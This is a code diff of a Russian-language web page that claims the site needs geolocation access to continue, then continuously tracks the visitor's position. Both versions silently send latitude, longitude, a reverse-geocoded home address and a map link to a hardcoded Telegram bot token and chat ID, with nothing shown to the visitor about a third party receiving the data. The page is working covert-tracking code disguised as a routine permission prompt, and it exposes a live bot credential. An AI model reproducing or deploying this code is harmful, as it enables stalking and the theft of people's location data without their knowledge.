@@ -1,246 +1,153 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Location Access</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Live Location</title>
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+<style>
+body {
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial;
+  background:linear-gradient(135deg,#06121f,#0a2a44,#0e3b5e);
+  color:white;
+}
 
-    body {
-      height: 100vh;
-      background: linear-gradient(135deg, #07121f, #0a2942, #103a5c);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      overflow: hidden;
-    }
+.card{
+  width:90%;
+  max-width:420px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(20px);
+  padding:25px;
+  border-radius:20px;
+  text-align:center;
+}
 
-    .card {
-      width: 90%;
-      max-width: 400px; :
-      background: rgba(255,255,255,0.08);
-      border: 1px solid rgba(255,255,255,0.15);
-      backdrop-filter: blur(20px);
-      border-radius: 24px;
-      padding: 30px;
-      text-align: center;
-      box-shadow: 0 0 40px rgba(0,0,0,0.4);
-    }
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:#00b7ff;
+  color:white;
+  font-weight:bold;
+  margin-top:10px;
+}
 
-    .logo {
-      width: 90px;
-      height: 90px;
-      margin: 0 auto 20px;
-      border-radius: 50%;
-      background: rgba(0,191,255,0.15);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 40px;
-    }
+.status{
+  margin-top:15px;
+  font-size:14px;
+  color:#bfe8ff;
+}
 
-    h1 {
-      font-size: 24px;
-      margin-bottom: 15px;
-    }
-
-    p {
-      color: #c8d8e8;
-      font-size: 15px;
-      line-height: 1.5;
-      margin-bottom: 25px;
-    }
-
-    button {
-      width: 100%;
-      padding: 15px;
-      border: none;
-      border-radius: 14px;
-      background: #00bfff;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.3s;
-      font-weight: bold;
-    }
-
-    button:hover {
-      background: #0099cc;
-    }
-
-    .status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #9ddcff;
-    }
-
-    .error {
-      color: #ff7b7b;
-    }
-
-    .success {
-      color: #72ffb0;
-    }
-
-    .loader {
-      width: 45px;
-      height: 45px;
-      border: 4px solid rgba(255,255,255,0.1);
-      border-top: 4px solid #00bfff;
-      border-radius: 50%;
-      margin: 0 auto 20px;
-      animation: spin 1s linear infinite;
-      display: none;
-    }
-
-    @keyframes spin {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    .coords {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #cfefff;
-      line-height: 1.6;
-      word-break: break-word;
-    }
-  </style>
+.addr{
+  margin-top:15px;
+  font-size:13px;
+  color:#d8f1ff;
+  line-height:1.5;
+}
+</style>
 </head>
 
 <body>
 
-  <div class="card">
-    <div class="loader" id="loader"></div>
+<div class="card">
+  <h2>📍 Location Access</h2>
+  <p>Разрешите геолокацию для продолжения</p>
 
-    <div class="logo">
-      📍
-    </div>
+  <button onclick="start()">Разрешить геолокацию</button>
 
-    <h1>Доступ к геолокации</h1>
+  <div class="status" id="status">ожидание...</div>
+  <div class="addr" id="addr"></div>
+</div>
 
-    <p>
-      Для продолжения работы сайта необходимо разрешить доступ к геолокации.
-    </p>
+<script>
+const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
+const CHAT_ID = "8424328584";
 
-    <button id="allowBtn">
-      Разрешить геолокацию
-    </button>
+let lastSend = 0;
+let watchId;
 
-    <div class="status" id="status">
-      Ожидание разрешения...
-    </div>
+async function getAddress(lat, lon){
+  try {
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
+    );
+    const data = await res.json();
+    return data.display_name || "адрес не найден";
+  } catch {
+    return "ошибка получения адреса";
+  }
+}
 
-    <div class="coords" id="coords"></div>
-  </div>
+async function sendTG(text){
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text
+    })
+  });
+}
 
-  <script>
-    const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
-    const CHAT_ID = "8424328584";
+function start(){
+  if(!navigator.geolocation){
+    alert("GPS не поддерживается");
+    return;
+  }
 
-    const button = document.getElementById("allowBtn");
-    const statusText = document.getElementById("status");
-    const coordsText = document.getElementById("coords");
-    const loader = document.getElementById("loader");
+  document.getElementById("status").innerText = "GPS активен...";
 
-    let lastSent = 0;
+  watchId = navigator.geolocation.watchPosition(async pos=>{
+    const now = Date.now();
 
-    async function sendToTelegram(message) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-          })
-        });
-      } catch (error) {
-        console.log(error);
-      }
-    }
+    // каждые 5 минут
+    if(now - lastSend < 5*60*1000) return;
+    lastSend = now;
 
-    function startTracking() {
-      if (!navigator.geolocation) {
-        statusText.innerHTML = "Геолокация не поддерживается";
-        statusText.className = "status error";
-        return;
-      }
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-      loader.style.display = "block";
+    const address = await getAddress(lat, lon);
 
-      navigator.geolocation.watchPosition(
-        async (position) => {
-          const now = Date.now();
+    document.getElementById("addr").innerHTML =
+      "📍 " + address;
 
-          if (now - lastSent < 5000) {
-            return;
-          }
+    document.getElementById("status").innerText =
+      "отправка данных...";
 
-          lastSent = now;
+    const msg =
+`📍 Live Location
 
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const accuracy = position.coords.accuracy;
+🏠 Адрес:
+${address}
 
-          loader.style.display = "none";
+🌐 Координаты:
+${lat}, ${lon}
 
-          statusText.innerHTML = "Геолокация активна";
-          statusText.className = "status success";
+🗺 Google Maps:
+https://maps.google.com/?q=${lat},${lon}`;
 
-          coordsText.innerHTML = `
-            Latitude: ${lat}<br>
-            Longitude: ${lon}<br>
-            Accuracy: ${Math.round(accuracy)}m
-          `;
+    await sendTG(msg);
 
-          const message = `
-📍 New Location
+    document.getElementById("status").innerText =
+      "активно (обновление каждые 5 минут)";
 
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: ${Math.round(accuracy)}m
-
-Google Maps:
-https://maps.google.com/?q=${lat},${lon}
-          `;
-
-          await sendToTelegram(message);
-        },
-
-        (error) => {
-          loader.style.display = "none";
-
-          statusText.innerHTML =
-            "Сайт недоступен. Разрешите доступ к геолокации.";
-          statusText.className = "status error";
-
-          console.log(error);
-        },
-
-        {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 10000
-        }
-      );
-    }
-
-    button.addEventListener("click", () => {
-      startTracking();
-    });
-  </script>
+  }, err=>{
+    document.getElementById("status").innerText =
+      "нужно разрешить геолокацию";
+  },{
+    enableHighAccuracy:true,
+    maximumAge:0,
+    timeout:10000
+  });
+}
+</script>
 
 </body>
 </html>
